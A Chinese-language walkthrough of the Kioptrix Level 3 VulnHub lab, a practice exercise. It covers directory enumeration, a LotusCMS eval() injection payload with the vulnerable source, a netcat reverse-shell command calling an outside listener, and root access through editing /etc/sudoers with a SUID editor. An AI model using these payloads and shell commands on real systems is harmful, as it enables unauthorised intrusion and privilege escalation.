# 靶机信息
KioptrixVM3是vulnhub中的一台简单难度的渗透测试靶机

# 靶机初始枚举

只开放了两个端口，攻击面很小，对信息收集的要求没那么高。

扫一下目录
```
└─$ cat webscan     
/modules              (Status: 301) [Size: 359] [--> http://192.168.218.199/modules/]
/cache                (Status: 301) [Size: 357] [--> http://192.168.218.199/cache/]
/data                 (Status: 403) [Size: 326]
/gallery              (Status: 301) [Size: 359] [--> http://192.168.218.199/gallery/]
/style                (Status: 301) [Size: 357] [--> http://192.168.218.199/style/]
/core                 (Status: 301) [Size: 356] [--> http://192.168.218.199/core/]
/index.php            (Status: 200) [Size: 1819]
/phpmyadmin           (Status: 301) [Size: 362] [--> http://192.168.218.199/phpmyadmin/]
/update.php           (Status: 200) [Size: 18]
/server-status        (Status: 403) [Size: 335]
/index.php            (Status: 200) [Size: 1819]
```

搜索一下lotusCMS的漏洞，有一个RCE漏洞
 Router() 函数中将 page= 参数传入 eval()，导致可以构造恶意输入
`?page=');system("id");//  ← 变成 eval("');system('id');//");`
扒到源码
```
getInputString("page", "index");
		
		//Get plugin request (if any)
		$plugin = $this->getInputString("system", "Page");
		
		//If there is a request for a plugin
		if(file_exists("core/plugs/".$plugin."Starter.php")){
			//Include Page fetcher
			include("core/plugs/".$plugin."Starter.php");

			//Fetch the page and get over loading cache etc...
			eval("new ".$plugin."Starter('".$page."');");
			
		}else if(file_exists("data/modules/".$plugin."/starter.dat")){
			//Include Module Fetching System
			include("core/lib/ModuleLoader.php");
			
			//Load Module
			new ModuleLoader($plugin, $this->getInputString("page", null));
		}else{ //Otherwise load a page from the standard system.
			//Include Page fetcher
			include("core/plugs/PageStarter.php");
			
			//Fetch the page and get over loading cache etc...
			new PageStarter($page);
		}
	}
	
	/**
	 * Returns a global variable
	 */
	protected function getInputString($name, $default_value = "", $format = "GPCS")
	{
		//order of retrieve default GPCS (get, post, cookie, session);
		$format_defines = array (
		'G'=>'_GET',
		'P'=>'_POST',
		'C'=>'_COOKIE',
		'S'=>'_SESSION',
		'R'=>'_REQUEST',
		'F'=>'_FILES',
		);
		preg_match_all("/[G|P|C|S|R|F]/", $format, $matches); //splitting to globals order
		foreach ($matches[0] as $k=>$glb)
		{
		    if ( isset ($GLOBALS[$format_defines[$glb]][$name]))
		    {   
			return htmlentities ( trim ( $GLOBALS[$format_defines[$glb]][$name] ) , ENT_NOQUOTES ) ;
		    }
		}
		return $default_value;
	} 

}

?>
```

<img width="1919" height="1039" alt="Image" src="https://github.com/user-attachments/assets/e0d23c11-d62a-4698-aa5b-fb5b63f51963" />

这里回弹shell需要使用 `nc 10.10.14.8 4444 -e /bin/bash` 
```
┌──(kali㉿kali)-[~/…/stageOne/writeup/vulnhub/KioptrixVM3]
└─$ sudo nc -lvnp 4444
listening on [any] 4444 ...
        connect to [192.168.218.148] from (UNKNOWN) [192.168.218.199] 57568
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash
```
# 提权
在检索suid程序的时候检索到一个非默认程序/usr/local/bin/ht
前提是使用python把交互环境配置好
这是一个编辑程序可以直接使用它修改一下root的文件，可以在网上搜一下怎么使用的，打开之后按F3，输入/etc/sudoers，再编辑，再按F2保存，再按F10退出
<img width="1605" height="678" alt="Image" src="https://github.com/user-attachments/assets/54dcc205-0b2a-45d7-bb14-fc87b8fd447e" />
```
www-data@Kioptrix3:/home/www/kioptrix3.com$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Kioptrix3:/home/www/kioptrix3.com$ ls
cache  data         gallery       index.php  style
core   favicon.ico  gnu-lgpl.txt  modules    update.php
www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo -l
User www-data may run the following commands on this host:
    (ALL) NOPASSWD: ALL
www-data@Kioptrix3:/home/www/kioptrix3.com$ sudo su
root@Kioptrix3:/home/www/kioptrix3.com# ls
cache  data         gallery       index.php  style
core   favicon.ico  gnu-lgpl.txt  modules    update.php
root@Kioptrix3:/home/www/kioptrix3.com# cd
root@Kioptrix3:~# ls
Congrats.txt  ht-2.0.18
root@Kioptrix3:~# 
```

# 反思
最后的提权不难，主要考的信息收集的能力，以及检索搜索漏洞的能力，这个靶机有很多漏洞，还有sql注入漏洞，去注入数据库那ssh的登录。